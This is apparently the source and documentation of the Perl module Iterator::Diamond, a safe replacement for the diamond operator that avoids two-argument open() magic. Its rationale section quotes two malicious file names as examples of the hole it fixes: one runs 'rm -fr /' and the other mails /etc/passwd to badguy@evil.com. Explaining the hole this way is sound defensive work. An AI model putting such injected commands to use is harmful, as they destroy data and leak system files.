#! perl

package Iterator::Diamond;

use warnings;
use strict;
use Carp;
use base qw(Iterator::Files);

=head1 NAME

Iterator::Diamond - Iterate through the files from ARGV

=cut

our $VERSION = '1.01';
$VERSION =~ tr/_//d;

=head1 SYNOPSIS

    use Iterator::Diamond;

    $input = Iterator::Diamond->new;
    while ( <$input> ) {
        ...
        warn("Current file is $ARGV\n");
    }

    # Alternatively:
    while ( $input->has_next ) {
        $line = $input->next;
        ...
    }

=head1 DESCRIPTION

Iterator::Diamond provides a safe and customizable replacement for the
C<< <> >> (Diamond) operator.

Just like C<< <> >> it returns the records of all files specified in
C<@ARGV>, one by one, as if it were one big happy file. In-place
editing of files is also supported. It does use C<@ARGV>, C<$ARGV> and
C<ARGVOUT> as documented in L<perlrun>, though without magic.

As opposed to the built-in C<< <> >> operator, no magic is applied to
the file names unless explicitly requested. This means that you're
protected from file names that may wreak havoc to your system when
processed through the magic of the two-argument open() that Perl
normally uses for C<< <> >>.

Iterator::Diamond is based on L<Iterator::Files>.

=head1 RATIONALE

Perl has two forms of open(), one with 2 arguments and one with 3 (or
more) arguments.

The 2-argument open is magical. It opens a file for reading or writing
according to a leading '<' or '>', strips leading and trailing
whitespace, starts programs and reads their output, or writes to their
input. A filename '-' is taken to be the standard input or output of
the program, depending on whether the file is opened for reading or
writing.

The 3-argument open is strict. The second argument designates the way
the file should be opened, and the third argument contains the file
name, taken literally.

Many programs read a series of files whose names are passed as command
line argument. The diamond operator makes this very easy:

  while ( <> ) {
    ....
  }

The program can then be run as something like

  myprog *.txt

Internally, Perl uses the 2-argument open for this.

What's wrong with that?

Well, this goes horribly wrong if you have file names that trigger the
magic of Perl's 2-argument open.

For example, if you have a file named ' foo.txt' (note the leading
space), running

  myprog *.txt

will surprise you with the error message

  Can't open  foo.txt: No such file or directory

This is still reasonably harmless. But what if you have a file
'>bar.txt'? Now, silently a new file 'bar.txt' is created. If you're
lucky, that is. It can also silently wipe out valuable data.

When your system administrator runs scripts like this, malicous file
names like 'rm -fr / |' or '|mail < /etc/passwd badguy@evil.com' can
be a severe threat to your system.

After a long discussion on the perl mailing list it was felt that this
security hole should be fixed. Iterator::Diamond does this by
providing a decent iterator that behaves just like C<< <> >>, but with
safe semantics.

If your perl is v5.22 or newer, and your script needs the diamond
iterator just inside a while loop condition, you can replace C<< <> >>
by C<<< <<>> >>> to get similar security.  Note, however, that a file
name of C<< '-' >> can not be interpreted as STDIN with that construct.

=head1 FUNCTIONS

=head2 new

Constructor. Creates a new iterator.

The iterator can be used by calling its methods, but it can also be
used as argument to the readline operator. See the examples in
L<SYNOPSIS>.

B<new> takes an optional series of key/value pairs to control the
exact way the iterator must behave.

=over 4

=item B<< magic => >> { none | stdin | all }

C<none> applies three-argument open semantics to all file names and do
not use any magic. This is the default behaviour.

C<stdin> is also safe. It applies three-argument open semantics but
allows a file name consisting of a single dash C<< - >> to mean the
standard input of the program. This is often very convenient.

C<all> applies two-argument open semantics. This makes the iteration
unsafe again, just like the built-in C<< <> >> operator.

=item B<< edit => >> I<suffix>

Enables in-place editing of files, just as the built-in C<< <> >> operator.

Unlike the built-in operator semantics, an empty suffix to discard backup
files is not supported.

=item B<< use_i_option >> I<boolean>

If set to true, and if B<edit> is not specified, the perl command line
option C<-i>I<suffix> will be used to enable or disable in-place editing.
By default, perl command line options are ignored.

=item B<< files => >> I<aref>

Use this list of files instead of @ARGV.

If C<files> are not specified and C<stdin> or C<all> magic is in effect,
an empty @ARGV will be treated as a list containing a single dash C<< - >>.

=back

=cut

sub new {
    my ($pkg, %args) = @_;
    my $use_i_option = delete $args{use_i_option};
    if ($use_i_option && !exists($args{edit}) && defined $^I) {
        $args{edit} = $^I;
    }
    my $self = $pkg->SUPER::new( files => \@ARGV, %args );
    if ( !exists($args{files}) && !@ARGV && $self->_magic_stdin ) {
        @ARGV = qw(-);
    }
    $self->{_current_file} = \$ARGV;
    return $self;
}

=head2 next

Method, no arguments.

Returns the next record of the input stream, or undef if the stream is
exhausted.

=cut

sub readline {
    shift->SUPER::readline;
}

#### WARNING ####
# From overload.pm: Even in list context, the iterator is currently
# called only once and with scalar context.
use overload '<>' => \&readline;

sub _advance {
    my $self = shift;
    my $res = $self->SUPER::_advance;
    return unless $res;
    open(ARGV, '<&=', fileno($self->{_current_fh}));
    if ( $self->{_edit} ) {
	no warnings 'once';
	open(ARGVOUT, '>&=', fileno($self->{_rewrite_fh}));
    }
    return $res;
}

=head2 has_next

Method, no arguments.

Returns true if the stream is not exhausted. A subsequent call to
C<next> will return a defined value.

This is the equivalent of the 'eof()' function.

=cut

=head2 is_eof

Method, no arguments.

Returns true if the current file is exhausted. A subsequent call to
C<next> will open the next file if available and start reading it.

This is the equivalent of the 'eof' function.

=cut

=head2 current_file

Method, no arguments.

Returns the name of the current file being processed.

=cut

=head1 GLOBAL VARIABLES

Since Iterator::Diamond is a plug-in replacement for the built-in C<<
<> >> operator, it uses the same global variables as C<< <> >> for the
same purposes.

=over 4

=item @ARGV

The list of file names to be processed. When a new file is opened, its
name is removed from the list.

=item $ARGV

The name of the file currently being processed. This can also be
obtained by using the iterators C<current_file> method.

=item $^I

Enables in-place editing and, optionally, designates the backup suffix
for edited files. See L<perlrun> for details.

Setting C<$^I> to I<suffix> has the same effect as using the Perl
command line argument C<-I>I<suffix> or using the C<edit=>I<suffix>
option to the iterator constructor.

=item ARGVOUT

When in-place editing, this file handle is used to open the new,
possibly modified, file to be written. This file handle is select()ed
for standard output.

=back

=head1 LIMITATIONS

Perl's internal ARGV processing is very magical, and cannot be
completely implemented in plain perl. However, the discrepancies
should not be noticeable in normal situations.

Even in list context, the iterator C<< <$input> >> is currently called
only once and with scalar context. This will not work as expected:

  my @lines = <$input>;

This reads all remaining lines:

  my @lines = $input->readline;

=head1 SEE ALSO

L<Iterator::Files>, open() in L<perlfun>, L<perlopentut>,
I/O Operators in L<perlop>.

=head1 AUTHOR

Johan Vromans, C<< <jv at cpan.org> >>

=head1 BUGS

Please report any bugs or feature requests to C<bug-iterator-diamond
at rt.cpan.org>, or through the web interface at
L<http://rt.cpan.org/NoAuth/ReportBug.html?Queue=Iterator-Diamond>. I
will be notified, and then you'll automatically be notified of
progress on your bug as I make changes.

=head1 SUPPORT

You can find documentation for this module with the perldoc command.

    perldoc Iterator::Diamond

You can also look for information at:

=over 4

=item * RT: CPAN's request tracker

L<http://rt.cpan.org/NoAuth/Bugs.html?Dist=Iterator-Diamond>

=item * CPAN Ratings

L<http://cpanratings.perl.org/d/Iterator-Diamond>

=item * Search CPAN

L<http://search.cpan.org/dist/Iterator-Diamond>

=back

=head1 ACKNOWLEDGEMENTS

This package was inspired by a most interesting discussion of the
perl5-porters mailing list, July 2008, on the topic of the unsafeness
of two-argument open() and its use in the C<< <> >> operator.

=head1 COPYRIGHT & LICENSE

Copyright 2016,2008 Johan Vromans, all rights reserved.

This program is free software; you can redistribute it and/or modify it
under the same terms as Perl itself.

=cut

=begin maybe_later

sub TIEHANDLE {
    goto &new;
}

sub READLINE {
    goto &readline;
}

tie *::ARGV, 'Iterator::Diamond';

=end maybe_later

=cut

1; # End of Iterator::Diamond

__END__
